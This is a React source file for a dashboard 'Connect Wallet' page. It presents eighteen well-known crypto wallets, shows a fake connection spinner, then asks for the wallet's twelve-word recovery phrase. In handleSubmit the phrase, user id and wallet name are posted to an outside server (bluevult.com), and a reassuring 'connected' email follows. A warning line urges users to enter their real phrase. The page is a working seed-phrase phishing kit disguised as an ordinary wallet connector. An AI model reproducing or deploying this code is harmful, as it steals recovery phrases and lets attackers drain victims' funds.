import TopBar from '@/components/dashboard/TopBar';
import { useState } from "react";
import { FaBars, FaMoon, FaSun, FaBell, FaUserCircle } from "react-icons/fa";
import Sidebar from "./dashboardWidgets/Sidebar";
import Footer from "@/components/landing/Footer";
import { useSystemSettings } from "@/hooks/useAdminData";

interface Wallet {
  name: string;
  icon: string;
}

const wallets: Wallet[] = [
  { name: "MetaMask", icon: "https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/metamask-icon.png" },
  { name: "WalletConnect", icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ0AbPy-s1RjwPfQ7H2JrlEFDhiPbp3Nxu9FQ&s" },
  { name: "Coinbase Wallet", icon: "https://cdn.iconscout.com/icon/free/png-256/free-coinbase-logo-icon-svg-download-png-7651204.png" },
  { name: "Trust Wallet", icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmNlWzKvlGNr0viUjjF7tkdYE4sw4rUfJXUA&s" },
  { name: "Phantom", icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTiGkKc9x8ijer2GWJjKLtjadSnU9f9KFWZkA&s" },
  { name: "OKX Wallet", icon: "https://cryptologos.cc/logos/okb-okb-logo.svg" },
  { name: "Binance Web3", icon: "https://cryptologos.cc/logos/bnb-bnb-logo.svg" },
  { name: "Exodus", icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRSYRWfaEBtFoUmCw5cRkqlbbc9PYN2COEYTQ&s" },
  { name: "Rainbow", icon: "https://avatars.githubusercontent.com/u/54352534?s=200&v=4" },
  { name: "Ledger", icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRlyEVWFG7zUzj0hHcuLWw_ICa9hv7YsDHDMg&s" },
  { name: "Trezor", icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR9qK2NaV_JvbjmOmIqW6O_MM5UOYYUzxD_JQ&s" },
  { name: "MathWallet", icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSjf6Lq3WFmPaxXBZuXi5BBgkuQz3kEFgH1mw&s" },
  { name: "BitKeep", icon: "https://dex-bin.bnbstatic.com/static/dapp-uploads/-3oftVu9lS0D5sm9-ol01" },
  { name: "SafePal", icon: "https://cryptologos.cc/logos/safepal-sfp-logo.svg" },
  { name: "Zerion", icon: "https://avatars.githubusercontent.com/u/24532704?s=200&v=4" },
  { name: "TokenPocket", icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ30gvsSOASqDyhUILUcpnk8yabrqsuVZKAyg&s" },
  { name: "Argent", icon: "https://avatars.githubusercontent.com/u/37312039?s=200&v=4" },
  { name: "Atomic", icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5NXuXvKhVRyHp9MAMIJgXAuxa34qIcCUMaw&s" },
];

export default function ConnectWalletPage() {
  const [activeWallet, setActiveWallet] = useState<Wallet | null>(null);
  const [loading, setLoading] = useState(false);
  const [sidebarOpen, setSidebarOpen] = useState(false); // mobile sidebar
  const [dark, setDark] = useState(false);
  const [words, setWords] = useState<string[]>(Array(12).fill("")); // 12-word state
   const uid = localStorage.getItem("user_id"); // example
   const [status, setStatus] = useState(""); // New state for showing request result
   const { data: settings = [] } = useSystemSettings();
   const emailNotifications = settings.find(s => s.setting_key === "email_notifications")?.setting_value !== "false";

  const openWallet = (wallet: Wallet) => {
    setActiveWallet(wallet);
    setLoading(true);
    setTimeout(() => setLoading(false), 1800);
  };

  const handleWordChange = (index: number, value: string) => {
    const newWords = [...words];
    newWords[index] = value.trim();
    setWords(newWords);
  };

      
    const handleSubmit = async () => {
      if (!activeWallet) return; // safety check
      const phrase = words.join(" "); // Combine 12 words into a single string
      setStatus("Connecting..."); // show loading status

      try {
        const res = await fetch("https://bluevult.com/api/index.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            q: "connect_wallet",
            user_id: uid,            // user's ID
            wallet_name: activeWallet.name, // send the exact wallet name
            phrase,                  // the 12-word phrase
          }),
        });

        const data = await res.json();
        console.log(data);

        if (data.success) {
          setStatus(`Wallet "${activeWallet.name}" connected successfully.`);

    if (emailNotifications) {
      fetch('/api/mail.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          subject: 'Wallet Connection Request.',
          name :localStorage.getItem("user_name"),
          email: localStorage.getItem("user_email"),

          message: 'Your '+ activeWallet.name+' wallet has been connected accepted, Your wallet will be connected as soon as possible. Check back in 5 minutes.'
        })
      })
      .then(res => res.json())
      .then(console.log)   // will show success or error from PHP
      .catch(console.error);
    }


        } else {
          setStatus(`Error: ${data.message}`);
        }
      } catch (err) {
        console.error(err);
        setStatus("Something went wrong ");
      }
    };
  return (
    <div className="min-h-screen bg-gray-100 text-gray-900">
      {/* Top bar */}
      <TopBar title="Connect Wallet" onSidebarToggle={() => setSidebarOpen(true)} />

      {/* Sidebar */}
      <div
        className={`fixed inset-y-0 left-0 w-64 bg-white shadow-lg z-50 transform transition-transform duration-300
        ${sidebarOpen ? "translate-x-0" : "-translate-x-full"} md:translate-x-0`}
      >
        <Sidebar onClose={() => setSidebarOpen(false)} />
      </div>

      {/* Overlay */}
      {sidebarOpen && (
        <div
          className="fixed inset-0 bg-black/30 z-40 md:hidden"
          onClick={() => setSidebarOpen(false)}
        />
      )}

      {/* Main */}
      <main>
        <div className="p-6 space-y-6 mt-16">
          <div className="max-w-6xl mx-auto">
            <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-5 gap-6">
              {wallets.map((wallet) => (
                <button
                  key={wallet.name}
                  onClick={() => openWallet(wallet)}
                  className="bg-white rounded-xl shadow-sm p-6 hover:shadow-md transition flex flex-col items-center gap-3"
                >
                  <img src={wallet.icon} className="h-10 w-10" />
                  <span className="text-sm font-medium">{wallet.name}</span>
                </button>
              ))}
            </div>
          </div>
        </div>
      </main>

      <Footer />

      {/* Modal */}
      {activeWallet && (
        <div className="fixed inset-0 bg-black/40 z-50 flex items-center justify-center px-4">
          <div className="bg-white rounded-2xl w-full max-w-lg p-8 space-y-6 relative">
            <button
              onClick={() => setActiveWallet(null)}
              className="absolute right-4 top-4 text-gray-400 hover:text-gray-600"
            >
              ✕
            </button>

            <div className="flex flex-col items-center gap-3">
              <img src={activeWallet.icon} className="h-12 w-12" />
              <h2 className="text-lg font-semibold">
                Connect {activeWallet.name}
              </h2>
            </div>

            {loading ? (
              <div className="flex flex-col items-center py-12">
                <div className="animate-spin h-8 w-8 border-2 border-gray-300 border-t-gray-900 rounded-full" />
                <p className="text-sm mt-4 text-gray-500">
                  Initializing connection…
                </p>
              </div>
            ) : (
              <>
                <div className="grid grid-cols-2 gap-3">
                  {words.map((word, i) => (
                    <input
                      key={i}
                      value={word}
                      onChange={(e) => handleWordChange(i, e.target.value)}
                      placeholder={`Phrase ${i + 1}`}
                      className="p-3 rounded-lg border text-sm focus:ring-2 focus:ring-gray-300"
                    />
                  ))}
                </div>

                <p className="text-xs text-red-500 text-center">
                  ⚠ Real interface only. Do not enter fake recovery phrases.
                </p>
                  {status && (
                  <p className="text-sm text-center text-green-600 dark:text-green-400 mb-2">
                  {status}
                  </p>
                  )}
                <button
                  onClick={handleSubmit}
                  className="w-full bg-gray-900 text-white py-4 rounded-xl hover:bg-gray-800 transition"
                >
                  Connect Wallet
                </button>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
}